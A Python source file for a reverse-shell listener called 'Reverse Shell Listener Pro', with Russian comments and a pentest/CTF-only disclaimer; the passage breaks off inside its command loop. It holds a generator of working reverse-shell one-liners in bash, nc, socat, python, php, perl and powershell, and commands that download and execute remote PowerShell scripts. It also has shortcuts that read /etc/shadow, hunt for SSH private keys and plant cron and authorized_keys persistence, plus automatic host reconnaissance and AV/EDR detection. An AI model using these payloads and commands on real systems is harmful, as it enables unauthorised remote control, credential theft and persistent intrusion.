"""
Reverse Shell Listener Pro — multi-session, broadcast, auto-recon, export.
Author: idqwixxa

⚠ Только для авторизованного пентеста / CTF / своей лаборатории.

Возможности:
    ─── Listener ───
    - Multi-session TCP listener
    - Persistence: save/load сессий (JSON)
    - Auto-reconnect loop (ожидание новых сессий)
    - Payload generator (bash/nc/socat/python/php/powershell) под текущий LHOST

    ─── Session ───
    - Auto-commands при подключении (Linux/Windows — авто-детект)
    - Авто-разбор вывода (users / hostname / IPs / OS / creds / sudo)
    - Labels + tags (для пометок)
    - Навигация use/background, broadcast команды на все сессии
    - Asciinema-записи (play через `asciinema play`)

    ─── TTY upgrade (10+ методов) ───
    - python PTY / script / socat / rlwrap / ConPTY
    - Авто-upgrade при подключении (опционально)

    ─── File transfer ───
    - Upload файла на цель (base64 / wget / curl)
    - Download файла с цели (base64 через cat)

    ─── Shortcuts (расширенный) ───
    - 25+ частых команд (recon / privesc / persistence)

    ─── Интеграция ───
    - Findings → notes (сессия с критичными данными)
    - Notify при новой сессии
    - Экспорт: JSON / HTML / Markdown / CSV
"""
import base64
import csv
import html as html_mod
import json
import os
import re
import socket
import threading
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any

from rich.console import Console
from rich.prompt import Prompt, IntPrompt, Confirm
from rich.table import Table

from core.config import REPORT_DIR
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

SHELL_DIR = REPORT_DIR / "shells"
SHELL_DIR.mkdir(parents=True, exist_ok=True)

SESSIONS_FILE = SHELL_DIR / "sessions_index.json"

DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 4444


# ===========================================================================
# Findings integration
# ===========================================================================

@dataclass
class ShellFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: ShellFinding) -> int:
    if f.severity not in ("critical", "high"):
        return -1
    try:
        from modules import notes
        return notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["shell", "session", f.kind],
            body=(f"**Kind:** {f.kind}\n"
                  f"**Target:** {f.target}\n\n"
                  f"**Evidence:**\n```\n{(f.evidence or '—')[:1500]}\n```\n\n"
                  f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1000]}`"),
        )
    except Exception:
        return -1


# ===========================================================================
# Auto-commands (расширено)
# ===========================================================================

AUTO_COMMANDS = [
    "id",
    "whoami",
    "hostname",
    "pwd",
    "uname -a",
    "cat /etc/os-release 2>/dev/null | head -5",
    "ip a 2>/dev/null || ifconfig 2>/dev/null",
    "netstat -an 2>/dev/null | head -5",
    "ps aux 2>/dev/null | head -10",
    "cat /etc/passwd 2>/dev/null | head -20",
    "sudo -n -l 2>/dev/null",
    "find / -perm -u=s -type f 2>/dev/null | head -10",
]

AUTO_COMMANDS_WIN = [
    "whoami",
    "whoami /priv",
    "whoami /groups",
    "hostname",
    "cd",
    "systeminfo | findstr /B /C:\"OS Name\" /C:\"OS Version\" /C:\"Domain\"",
    "ipconfig /all",
    "net user",
    "net localgroup administrators",
    "net share",
    "tasklist | findstr /I \"av\\|defender\\|crowd\"",
    "reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
]

# Быстрый детект OS-подсказок по баннеру
OS_DETECT_PATTERNS = [
    (r"(?i)windows|microsoft|win32|c:\\users", "windows"),
    (r"(?i)ubuntu|debian|centos|redhat|fedora|kali|arch|alpine|linux", "linux"),
    (r"(?i)darwin|macos|osx|/users/", "macos"),
    (r"(?i)freebsd|openbsd|netbsd", "bsd"),
]


# ===========================================================================
# TTY upgrade (расширено)
# ===========================================================================

TTY_UPGRADE_CMDS = {
    # Linux
    "linux_python3": (
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
    ),
    "linux_python": (
        "python -c 'import pty; pty.spawn(\"/bin/bash\")'"
    ),
    "linux_script": "script -qc /bin/bash /dev/null",
    "linux_script_alt": "script /dev/null -c bash",
    "linux_socat": (
        "socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
        "tcp:LHOST:LPORT"
    ),
    "linux_perl": (
        "perl -e 'exec \"/bin/bash\";'"
    ),
    # Windows
    "win_conpty": (
        "IEX(IWR https://raw.githubusercontent.com/antonioCoco/"
        "ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); "
        "Invoke-ConPtyShell LHOST LPORT"
    ),
    "win_powershell": (
        "powershell -nop -c \"[System.Net.ServicePointManager]::"
        "SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; "
        "IEX (New-Object Net.WebClient).DownloadString("
        "'http://LHOST:LPORT/ps.ps1')\""
    ),
    # Универсальные клиентские команды (для оператора)
    "operator_stty": (
        "# После python pty:\n"
        "# 1) Ctrl+Z\n"
        "# 2) stty raw -echo; fg\n"
        "# 3) export TERM=xterm; export SHELL=/bin/bash\n"
        "# 4) stty rows 50 cols 200"
    ),
    "operator_rlwrap": "rlwrap nc -lvnp LPORT",
}


SHORTCUTS = {
    # Recon
    "l": "ls -la",
    "la": "ls -la /var/www /home /opt /srv 2>/dev/null",
    "pw": "cat /etc/passwd",
    "sh": "cat /etc/shadow 2>/dev/null",
    "h": "history",
    "env": "env",
    "ps": "ps aux",
    "net": "netstat -anp 2>/dev/null || ss -tulnp",
    "who": "whoami && id",
    "host": "hostname && uname -a",
    # Priv-esc
    "su": "sudo -l",
    "sui": "sudo -n -l 2>/dev/null",
    "f": "find / -perm -u=s -type f 2>/dev/null",
    "cap": "getcap -r / 2>/dev/null",
    "cron": "cat /etc/crontab; ls -la /etc/cron.*",
    "keys": "find / -name id_rsa -o -name id_ed25519 2>/dev/null",
    "bash_hist": "cat ~/.bash_history 2>/dev/null | tail -50",
    # Web
    "www": "ls -la /var/www /var/www/html 2>/dev/null",
    "conf": "find /var/www -name '*.conf' -o -name '*.env' 2>/dev/null",
    "docker": "docker ps 2>/dev/null; ls -la /var/run/docker.sock 2>/dev/null",
    # Persistence
    "cronp": "echo '* * * * * /tmp/p.sh' | crontab -",
    "auth_keys": "mkdir -p ~/.ssh && echo 'ssh-rsa AAA...' >> ~/.ssh/authorized_keys",
    # Files
    "dl": "download",  # pseudo
    "ul": "upload",    # pseudo
    # Generic
    "w": "wget",
    "c": "curl",
}


# ===========================================================================
# Session
# ===========================================================================

class Session:
    def __init__(self, sid: int, addr: tuple, sock: socket.socket,
                 auto_commands: list[str] | None = None,
                 label: str = "") -> None:
        self.sid = sid
        self.addr = addr
        self.sock = sock
        self.label = label
        self.tags: set[str] = set()
        self.connected_at = datetime.now()
        self.last_activity = datetime.now()
        self.buffer = bytearray()
        self.commands: list[tuple[datetime, str]] = []
        self.alive = True
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self.auto_commands = (auto_commands if auto_commands is not None
                              else list(AUTO_COMMANDS))
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        self.log_file = SHELL_DIR / f"sess_{sid}_{ts}.json"
        self.asciinema_file = SHELL_DIR / f"sess_{sid}_{ts}.cast"
        self.raw_file = SHELL_DIR / f"sess_{sid}_{ts}.raw"
        self._log_handle = self.log_file.open("w", encoding="utf-8")
        self._asciinema_handle = self.asciinema_file.open("w",
                                                           encoding="utf-8")
        self._raw_handle = self.raw_file.open("wb")
        self._start_time = time.time()
        self._os_hint = "unknown"
        # Найденные артефакты
        self.findings: dict[str, Any] = {
            "users": set(),
            "hostname": "",
            "ips": set(),
            "sudo_rights": [],
            "suid": [],
            "creds": [],
            "av": [],
        }

        # asciinema header
        try:
            self._asciinema_handle.write(json.dumps({
                "version": 2,
                "width": 120,
                "height": 40,
                "timestamp": int(time.time()),
                "env": {"SHELL": "/bin/sh", "TERM": "xterm-256color"},
                "title": f"session {sid} — {addr[0]}:{addr[1]}",
            }) + "\n")
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Lifecycle
    # ------------------------------------------------------------------

    def start(self) -> None:
        t = threading.Thread(target=self._reader, daemon=True,
                             name=f"session-{self.sid}-read")
        t.start()
        if self.auto_commands:
            threading.Thread(target=self._run_auto, daemon=True,
                             name=f"session-{self.sid}-auto").start()

    def _run_auto(self) -> None:
        time.sleep(1.5)
        # Детект OS
        try:
            self.send("whoami 2>/dev/null || echo __WIN__")
            time.sleep(1.5)
            hint = self.buffer.decode("utf-8", errors="ignore")
            self._os_hint = self._detect_os(hint)
            time.sleep(0.5)
            for c in self.auto_commands[:12]:
                self.send(c)
                time.sleep(1.2)
        except Exception as exc:
            log.debug("auto: %s", exc)

    @staticmethod
    def _detect_os(hint: str) -> str:
        for pat, name in OS_DETECT_PATTERNS:
            if re.search(pat, hint):
                return name
        return "unknown"

    def _reader(self) -> None:
        try:
            self.sock.settimeout(1.0)
        except Exception:
            pass
        while not self._stop.is_set():
            try:
                data = self.sock.recv(8192)
            except socket.timeout:
                continue
            except OSError:
                break
            if not data:
                break
            with self._lock:
                self.buffer.extend(data)
                self.last_activity = datetime.now()
            # asciinema
            try:
                elapsed = time.time() - self._start_time
                text = data.decode("utf-8", errors="replace")
                self._asciinema_handle.write(json.dumps(
                    [round(elapsed, 3), "o", text]) + "\n")
                self._asciinema_handle.flush()
            except Exception:
                pass
            # raw
            try:
                self._raw_handle.write(data)
                self._raw_handle.flush()
            except Exception:
                pass
            # Авто-разбор артефактов
            try:
                self._parse_output(data.decode("utf-8", errors="replace"))
            except Exception:
                pass
        self.alive = False

    def _parse_output(self, text: str) -> None:
        """Авто-разбор интересных данных из вывода."""
        # users
        for m in re.finditer(r"uid=\d+\((\w+)\)", text):
            self.findings["users"].add(m.group(1))
        # hostnames
        for m in re.finditer(r"(?m)^([a-z0-9\-]{3,30})\s*$", text):
            if self._os_hint == "linux" and not m.group(1).startswith(
                    ("total", "drwx", "-rw")):
                self.findings["hostname"] = m.group(1)
                break
        # IPs
        for m in re.finditer(
            r"\b(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}"
            r"(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\b", text):
            ip = m.group()
            if ip not in ("0.0.0.0", "127.0.0.1"):
                self.findings["ips"].add(ip)
        # sudo
        for m in re.finditer(r"\(ALL\)\s+NOPASSWD:\s*(\S+)", text):
            self.findings["sudo_rights"].append(m.group(1))
        # SUID
        for m in re.finditer(r"(?m)^\S*\s+\S+\s+\S+\s+\S+\s+\S+\s+\S+\s+"
                              r"\S+\s+\S+\s+(\S+/[a-z0-9\-_.]+)$", text):
            self.findings["suid"].append(m.group(1))
        # AV / EDR hints
        for kw in ("defender", "crowdstrike", "sentinelone", "carbonblack",
                   "cylance", "sophos", "kaspersky", "mcafee", "symantec"):
            if kw in text.lower():
                self.findings["av"].append(kw)

    def send(self, cmd: str) -> None:
        with self._lock:
            if not self.alive:
                raise RuntimeError("session dead")
            try:
                self.sock.sendall((cmd + "\n").encode("utf-8",
                                                       errors="replace"))
            except OSError as exc:
                self.alive = False
                raise RuntimeError(f"send failed: {exc}")
            self.commands.append((datetime.now(), cmd))
            self.last_activity = datetime.now()
            try:
                self._log_handle.write(json.dumps({
                    "ts": datetime.now().isoformat(),
                    "dir": "out",
                    "cmd": cmd,
                }) + "\n")
                self._log_handle.flush()
            except Exception:
                pass

    def read(self, clear: bool = True) -> str:
        with self._lock:
            data = bytes(self.buffer)
            if clear:
                self.buffer.clear()
        text = data.decode("utf-8", errors="replace")
        try:
            self._log_handle.write(json.dumps({
                "ts": datetime.now().isoformat(),
                "dir": "in",
                "data": text[:4096],
            }) + "\n")
        except Exception:
            pass
        return text

    def close(self) -> None:
        self._stop.set()
        try:
            self.sock.close()
        except Exception:
            pass
        for h in (self._log_handle, self._asciinema_handle, self._raw_handle):
            try:
                h.close()
            except Exception:
                pass
        self.alive = False

    # ------------------------------------------------------------------
    # Upload/Download
    # ------------------------------------------------------------------

    def upload_b64(self, local_path: str, remote_path: str = "/tmp/f") -> bool:
        """Загрузить файл на цель через base64."""
        p = Path(local_path)
        if not p.exists():
            return False
        try:
            b64 = base64.b64encode(p.read_bytes()).decode()
            self.send(f"echo '{b64}' | base64 -d > {remote_path}")
            time.sleep(1.5)
            return True
        except Exception as exc:
            log.warning("upload_b64: %s", exc)
            return False

    def download_b64(self, remote_path: str,
                     local_path: str | None = None) -> bool:
        """Скачать файл с цели через base64."""
        if not local_path:
            local_path = str(SHELL_DIR / f"sess{self.sid}_" +
                              Path(remote_path).name)
        try:
            self.send(f"base64 -w0 {remote_path} 2>/dev/null")
            time.sleep(2.0)
            output = self.read()
            # Извлечь longest base64-line
            b64_lines = [ln.strip() for ln in output.splitlines()
                         if ln.strip() and re.match(r"^[A-Za-z0-9+/=]{40,}$",
                                                     ln.strip())]
            if not b64_lines:
                return False
            b64 = max(b64_lines, key=len)
            b64 += "=" * (-len(b64) % 4)
            Path(local_path).write_bytes(base64.b64decode(b64))
            console.print(f"[green]✓ Скачано: {local_path} "
                          f"({Path(local_path).stat().st_size} B)[/green]")
            return True
        except Exception as exc:
            log.warning("download_b64: %s", exc)
            return False


# ===========================================================================
# Listener
# ===========================================================================

class ShellListenerPro:
    def __init__(self, host: str = DEFAULT_HOST, port: int = DEFAULT_PORT,
                 auto_commands: list[str] | None = None) -> None:
        self.host = host
        self.port = port
        self.auto_commands = auto_commands
        self.sessions: dict[int, Session] = {}
        self._next_id = 1
        self._stop = threading.Event()
        self._server_sock: socket.socket | None = None
        self._accept_thread: threading.Thread | None = None
        self._lock = threading.Lock()

    def start(self) -> None:
        self._server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._server_sock.bind((self.host, self.port))
        self._server_sock.listen(16)
        self._stop.clear()
        self._accept_thread = threading.Thread(
            target=self._accept, daemon=True, name="shell-accept")
        self._accept_thread.start()
        console.print(f"[green]✓ Listener: {self.host}:{self.port}[/green]")
        console.print(f"[dim]Логи: {SHELL_DIR}[/dim]")
        console.print(f"[dim]Автокоманды: "
                      f"{'вкл' if self.auto_commands else 'выкл'}[/dim]")

    def _accept(self) -> None:
        try:
            self._server_sock.settimeout(1.0)
        except Exception:
            return
        while not self._stop.is_set():
            try:
                client, addr = self._server_sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            with self._lock:
                sid = self._next_id
                self._next_id += 1
            sess = Session(sid, addr, client, self.auto_commands)
            sess.start()
            with self._lock:
                self.sessions[sid] = sess
            console.print(f"\n[bold green]● Shell #{sid} от "
                          f"{addr[0]}:{addr[1]}[/bold green]")
            try:
                db.save_scan("shell_pro", f"{addr[0]}:{addr[1]}",
                             {"session_id": sid})
            except Exception:
                pass
            # Notify
            try:
                from modules import notifier
                notifier.notify_all(
                    f"🐚 New shell #{sid}",
                    f"From: {addr[0]}:{addr[1]}\n"
                    f"Auto-commands: "
                    f"{'on' if self.auto_commands else 'off'}",
                    severity="high",
                )
            except Exception:
                pass

    def stop(self) -> None:
        self._stop.set()
        if self._server_sock:
            try:
                self._server_sock.close()
            except Exception:
                pass
        with self._lock:
            for s in self.sessions.values():
                s.close()

    def get(self, sid: int) -> Session | None:
        with self._lock:
            return self.sessions.get(sid)

    def remove(self, sid: int) -> bool:
        with self._lock:
            s = self.sessions.pop(sid, None)
        if s:
            s.close()
            return True
        return False

    def list(self) -> list[Session]:
        with self._lock:
            return list(self.sessions.values())

    def broadcast(self, cmd: str) -> int:
        """Отправить команду всем живым сессиям. Возвращает кол-во успешных."""
        sent = 0
        for s in self.list():
            if not s.alive:
                continue
            try:
                s.send(cmd)
                sent += 1
            except Exception:
                continue
        return sent

    @property
    def running(self) -> bool:
        return (self._accept_thread is not None
                and self._accept_thread.is_alive())


# ===========================================================================
# Printing
# ===========================================================================

HELP_TEXT = """
[bold cyan]🐚 Shell Listener Pro — команды:[/bold cyan]

  [green]sessions[/green] / [green]ls[/green]        — список сессий
  [green]use <id>[/green]              — переключиться
  [green]background[/green] / [green]bg[/green]      — вернуться в меню (внутри сессии)
  [green]read <id>[/green]             — прочитать вывод
  [green]peek <id>[/green]             — посмотреть без очистки буфера
  [green]send <id> <cmd>[/green]        — отправить команду
  [green]broadcast <cmd>[/green]       — отправить ВСЕМ сессиям
  [green]quick <shortcut>[/green]      — шорткат (см. shortcuts)
  [green]label <id> <text>[/green]      — пометить сессию
  [green]tag <id> <tag>[/green]        — добавить тег
  [green]tty <id>[/green]              — TTY upgrade (python pty)
  [green]tty-all[/green]               — TTY upgrade на все сессии
  [green]upload <id> <local> [remote][/green]  — загрузить файл на цель (base64)
  [green]download <id> <remote> [local][/green] — скачать файл с цели
  [green]info <id>[/green]             — инфо о сессии
  [green]findings <id>[/green]         — авто-артефакты сессии
  [green]note <id>[/green]             — сохранить сессию как finding
  [green]kill <id>[/green] / [green]kill-all[/green]
  [green]logs <id>[/green]             — путь к логам
  [green]cast <id>[/green]             — путь к asciinema-записи
  [green]history <id>[/green]          — история команд
  [green]search <text>[/green]         — поиск в истории всех сессий
  [green]payload [kind] [lhost][/green] — генератор reverse shell
  [green]export <json|html|md|csv>[/green]
  [green]shortcuts[/green]             — список шорткатов
  [green]help[/green] / [green]exit[/green]
"""


def _print_sessions(sessions: list[Session]) -> None:
    table = Table(title=f"🐚 Sessions ({len(sessions)})")
    table.add_column("ID", style="cyan", width=5)
    table.add_column("Label", style="yellow", max_width=14)
    table.add_column("Address", style="green", width=18)
    table.add_column("OS", style="magenta", width=9)
    table.add_column("Uptime", width=9)
    table.add_column("Idle", width=9)
    table.add_column("Cmds", width=5)
    table.add_column("Tags", style="dim", max_width=15)
    table.add_column("St", width=3)
    now = datetime.now()
    for s in sessions:
        table.add_row(
            f"#{s.sid}",
            (s.label or "—")[:14],
            f"{s.addr[0]}:{s.addr[1]}",
            s._os_hint,
            str(now - s.connected_at).split(".")[0],
            str(now - s.last_activity).split(".")[0],
            str(len(s.commands)),
            ",".join(list(s.tags)[:3]) or "—",
            "🟢" if s.alive else "⚪",
        )
    console.print(table)


def _session_info(s: Session) -> None:
    t = Table(title=f"🐚 Session #{s.sid}")
    t.add_column("Field", style="cyan")
    t.add_column("Value", style="green")
    t.add_row("Addr", f"{s.addr[0]}:{s.addr[1]}")
    t.add_row("Label", s.label or "—")
    t.add_row("Tags", ", ".join(sorted(s.tags)) or "—")
    t.add_row("Connected", s.connected_at.strftime("%Y-%m-%d %H:%M:%S"))
    t.add_row("OS hint", s._os_hint)
    t.add_row("Alive", "✓" if s.alive else "✗")
    t.add_row("Commands", str(len(s.commands)))
    t.add_row("Log file", str(s.log_file))
    t.add_row("Asciinema", str(s.asciinema_file))
    console.print(t)


def _print_findings(s: Session) -> None:
    t = Table(title=f"🔎 Findings — session #{s.sid}")
    t.add_column("Категория", style="cyan")
    t.add_column("Значения", style="green", max_width=80)
    f = s.findings
    if f.get("users"):
        t.add_row("Users", ", ".join(sorted(f["users"])[:20]))
    if f.get("hostname"):
        t.add_row("Hostname", str(f["hostname"]))
    if f.get("ips"):
        t.add_row("IPs", ", ".join(sorted(f["ips"])[:20]))
    if f.get("sudo_rights"):
        t.add_row("Sudo", ", ".join(f["sudo_rights"][:10]))
    if f.get("suid"):
        t.add_row("SUID", ", ".join(f["suid"][:10]))
    if f.get("av"):
        t.add_row("AV/EDR hints", ", ".join(set(f["av"])))
    console.print(t)


# ===========================================================================
# Payload generator
# ===========================================================================

def _payloads(lhost: str, lport: int) -> dict[str, str]:
    return {
        "bash": f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
        "bash (mkfifo)":
            f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|"
            f"nc {lhost} {lport} >/tmp/f",
        "python3":
            f"python3 -c 'import socket,subprocess,os;"
            f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
            f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
            f"os.dup2(s.fileno(),2);"
            f"subprocess.call([\"/bin/sh\",\"-i\"])'",
        "nc": f"nc -e /bin/sh {lhost} {lport}",
        "socat":
            f"socat exec:'bash -li',pty,stderr,setsid,sigint,sane "
            f"tcp:{lhost}:{lport}",
        "php":
            f"php -r '$sock=fsockopen(\"{lhost}\",{lport});"
            f"exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "perl":
            f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
            f"socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
            f"if(connect(S,sockaddr_in($p,inet_aton($i))))"
            f"{{open(STDIN,\">&S\");open(STDOUT,\">&S\");"
            f"open(STDERR,\">&S\");exec(\"/bin/sh -i\");}}'",
        "powershell":
            f"powershell -nop -c \"$c=New-Object Net.Sockets.TCPClient("
            f"'{lhost}',{lport});$s=$c.GetStream();"
            f"[byte[]]$b=0..65535|%{{0}};"
            f"while(($i=$s.Read($b,0,$b.Length)) -ne 0){{"
            f"$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
            f"$o=(iex $d 2>&1|Out-String);"
            f"$sb=([Text.encoding]::ASCII).GetBytes($o);"
            f"$s.Write($sb,0,$sb.Length)}}\"",
    }


def show_payloads(lhost: str, lport: int) -> None:
    console.print(f"\n[bold cyan]💀 Payloads → {lhost}:{lport}"
                  f"[/bold cyan]\n")
    for name, cmd in _payloads(lhost, lport).items():
        t = Table(title=f"[bold green]{name}[/bold green]",
                  show_header=False, border_style="dim")
        t.add_column("Cmd")
        t.add_row(f"[green]{cmd}[/green]")
        console.print(t)


# ===========================================================================
# Export sessions
# ===========================================================================

def export_sessions(sessions: list[Session], fmt: str = "json",
                    out_path: str | None = None) -> Path | None:
    """Экспорт сессий (метаданные + stats)."""
    if not sessions:
        console.print("[yellow]Нет сессий.[/yellow]")
        return None
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    ext = {"json": ".json", "md": ".md", "html": ".html",
           "csv": ".csv"}.get(fmt, ".json")
    if not out_path:
        out_path = str(SHELL_DIR / f"sessions_{ts}{ext}")
    path = Path(out_path)

    def _ser(s: Session) -> dict:
        return {
            "sid": s.sid,
            "label": s.label,
            "tags": sorted(s.tags),
            "addr": f"{s.addr[0]}:{s.addr[1]}",
            "connected_at": s.connected_at.isoformat(),
            "last_activity": s.last_activity.isoformat(),
            "os_hint": s._os_hint,
            "alive": s.alive,
            "commands_count": len(s.commands),
            "log_file": str(s.log_file),
            "asciinema_file": str(s.asciinema_file),
            "findings": {
                "users": sorted(s.findings.get("users") or []),
                "hostname": s.findings.get("hostname", ""),
                "ips": sorted(s.findings.get("ips") or []),
                "sudo_rights": s.findings.get("sudo_rights") or [],
                "suid": s.findings.get("suid") or [],
                "av": sorted(set(s.findings.get("av") or [])),
            },
        }

    try:
        if fmt == "json":
            path.write_text(
                json.dumps([_ser(s) for s in sessions],
                            indent=2, ensure_ascii=False, default=str),
                encoding="utf-8")
        elif fmt == "md":
            lines = [
                "# Shell sessions",
                f"_Generated: {datetime.now().isoformat()}_", "",
                f"Total: **{len(sessions)}**", "",
                "| ID | Label | Addr | OS | Uptime | Cmds | Tags |",
                "|----|-------|------|----|--------|------|------|",
            ]
            now = datetime.now()
            for s in sessions:
                uptime = str(now - s.connected_at).split(".")[0]
                lines.append(
                    f"| #{s.sid} | {s.label or '—'} | "
                    f"{s.addr[0]}:{s.addr[1]} | {s._os_hint} | "
                    f"{uptime} | {len(s.commands)} | "
                    f"{','.join(list(s.tags)[:3]) or '—'} |"
                )
            for s in sessions:
                lines.append("")
                lines.append(f"## Session #{s.sid} — findings")
                lines.append("")
                f = s.findings
                if f.get("users"):
                    lines.append(f"- Users: {', '.join(sorted(f['users']))}")
                if f.get("hostname"):
                    lines.append(f"- Hostname: {f['hostname']}")
                if f.get("ips"):
                    lines.append(f"- IPs: {', '.join(sorted(f['ips']))}")
                if f.get("sudo_rights"):
                    lines.append(f"- Sudo: {', '.join(f['sudo_rights'][:10])}")
            path.write_text("\n".join(lines), encoding="utf-8")
        elif fmt == "csv":
            with path.open("w", newline="", encoding="utf-8") as fp:
                w = csv.writer(fp)
                w.writerow(["sid", "label", "addr", "os_hint", "alive",
                            "commands", "tags", "log", "cast"])
                for s in sessions:
                    w.writerow([
                        s.sid, s.label,
                        f"{s.addr[0]}:{s.addr[1]}",
                        s._os_hint, "1" if s.alive else "0",
                        len(s.commands),
                        ",".join(sorted(s.tags)),
                        str(s.log_file), str(s.asciinema_file),
                    ])
        elif fmt == "html":
            parts = [
                "<!DOCTYPE html><html lang='ru'><head><meta charset='utf-8'>",
                "<title>Shell sessions</title>",
                "<style>",
                "body{background:#0a0a0a;color:#c8c8c8;font-family:monospace;"
                "padding:24px;line-height:1.5;}",
                "h1{color:#00ff9c;border-bottom:2px solid #00ff9c;}",
                "table{width:100%;border-collapse:collapse;margin-top:12px;"
                "font-size:13px;}",
                "th{background:#111;color:#00ff9c;padding:6px;text-align:left;"
                "border:1px solid #222;}",
                "td{padding:4px 6px;border:1px solid #222;word-break:break-all;}",
                "tr:nth-child(even){background:#0d0d0d;}",
                ".alive{color:#00ff9c;}.dead{color:#888;}",
                "</style></head><body>",
                f"<h1>🐚 Shell sessions ({len(sessions)})</h1>",
                f"<p>Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>",
                "<table><tr><th>ID</th><th>Label</th><th>Addr</th>"
                "<th>OS</th><th>Uptime</th><th>Cmds</th>"
                "<th>Users</th><th>Hostname</th><th>IPs</th></tr>",
            ]
            now = datetime.now()
            for s in sessions:
                uptime = str(now - s.connected_at).split(".")[0]
                cls = "alive" if s.alive else "dead"
                users = ", ".join(sorted(s.findings.get("users") or [])[:10])
                ips = ", ".join(sorted(s.findings.get("ips") or [])[:6])
                parts.append(
                    f"<tr><td class='{cls}'>#{s.sid}</td>"
                    f"<td>{html_mod.escape(s.label or '—')}</td>"
                    f"<td>{html_mod.escape(f'{s.addr[0]}:{s.addr[1]}')}</td>"
                    f"<td>{html_mod.escape(s._os_hint)}</td>"
                    f"<td>{html_mod.escape(uptime)}</td>"
                    f"<td>{len(s.commands)}</td>"
                    f"<td>{html_mod.escape(users)}</td>"
                    f"<td>{html_mod.escape(str(s.findings.get('hostname') or ''))}</td>"
                    f"<td>{html_mod.escape(ips)}</td></tr>"
                )
            parts.append("</table></body></html>")
            path.write_text("\n".join(parts), encoding="utf-8")
        console.print(f"[green]✓ {fmt.upper()}: {path}[/green]")
        return path
    except Exception as exc:
        console.print(f"[red]Ошибка экспорта: {exc}[/red]")
        return None


# ===========================================================================
# REPL
# ===========================================================================

def repl(host: str = DEFAULT_HOST, port: int = DEFAULT_PORT,
         auto_commands: list[str] | None = None,
         auto_commands_win: bool = False) -> None:
    listener = ShellListenerPro(host, port, auto_commands)
    try:
        listener.start()
    except Exception as exc:
        console.print(f"[red]Ошибка запуска: {exc}[/red]")
        return

    console.print("[yellow]⚠ Только для авторизованного пентеста / CTF."
                  "[/yellow]")
    console.print("[dim]help для справки[/dim]\n")

    current: int | None = None

    try:
        while True:
            try:
                prompt = (f"session {current}> " if current is not None
                          else "listener> ")
                line = input(prompt).strip()
            except (EOFError, KeyboardInterrupt):
                console.print()
                if current is not None:
                    current = None
                    continue
                break

            if not line:
                continue

            # ── Внутри сессии ──
            if current is not None:
                s = listener.get(current)
                if not s or not s.alive:
                    console.print(f"[red]#{current} потеряна.[/red]")
                    current = None
                    continue
                low = line.lower()
                if low in ("background", "bg", "back"):
                    current = None
                    continue
                if low == "read":
                    console.print(s.read() or "[dim](пусто)[/dim]")
                    continue
                if low == "peek":
                    console.print(s.read(clear=False) or "[dim](пусто)[/dim]")
                    continue
                if low == "info":
                    _session_info(s)
                    continue
                if low == "findings":
                    _print_findings(s)
                    continue
                if low == "tty":
                    try:
                        s.send(TTY_UPGRADE_CMDS["linux_python3"])
                        console.print("[green]→ TTY upgrade отправлен[/green]")
                        time.sleep(0.5)
                        console.print(s.read() or "[dim](пусто)[/dim]")
                    except Exception as exc:
                        console.print(f"[red]{exc}[/red]")
                    continue
                if low in SHORTCUTS:
                    cmd = SHORTCUTS[low]
                    if cmd in ("download", "upload"):
                        console.print(f"[dim]Используй команды download/"
                                      f"upload вне сессии.[/dim]")
                        continue
                    try:
                        s.send(cmd)
                        time.sleep(0.6)
                        console.print(s.read() or "")
                    except Exception as exc:
                        console.print(f"[red]{exc}[/red]")
                    continue
                if low.startswith("!"):
                    try:
                        s.send(line[1:])
                    except Exception:
                        pass
                    continue
                # Обычная команда
                try:
                    s.send(line)
                    time.sleep(0.6)
                    console.print(s.read() or "[dim](пусто)[/dim]")
                except Exception as exc:
                    console.print(f"[red]{exc}[/red]")
                continue

            # ── Главное меню ──
            parts = line.split(None, 1)
            cmd = parts[0].lower()
            arg = parts[1].strip() if len(parts) > 1 else ""

            if cmd in ("exit", "quit", "q"):
                break
            if cmd in ("help", "?"):
                console.print(HELP_TEXT)
                continue
            if cmd in ("sessions", "list", "ls"):
                _print_sessions(listener.list())
                continue
            if cmd == "use":
                if not arg.isdigit():
                    console.print("[red]use <id>[/red]")
                    continue
                s = listener.get(int(arg))
                if not s:
                    console.print(f"[red]#{arg} не найдена.[/red]")
                    continue
                current = int(arg)
                console.print(f"[green]→ session {current} "
                              f"({s.addr[0]}:{s.addr[1]})[/green]")
                continue
            if cmd == "read":
                if not arg.isdigit():
                    console.print("[red]read <id>[/red]")
                    continue
                s = listener.get(int(arg))
                if s:
                    console.print(s.read() or "[dim](пусто)[/dim]")
                continue
            if cmd == "peek":
                if not arg.isdigit():
                    continue
                s = listener.get(int(arg))
                if s:
                    console.print(s.read(clear=False) or "[dim](пусто)[/dim]")
                continue
            if cmd == "send":
                sp = arg.split(None, 1)
                if len(sp) < 2 or not sp[0].isdigit():
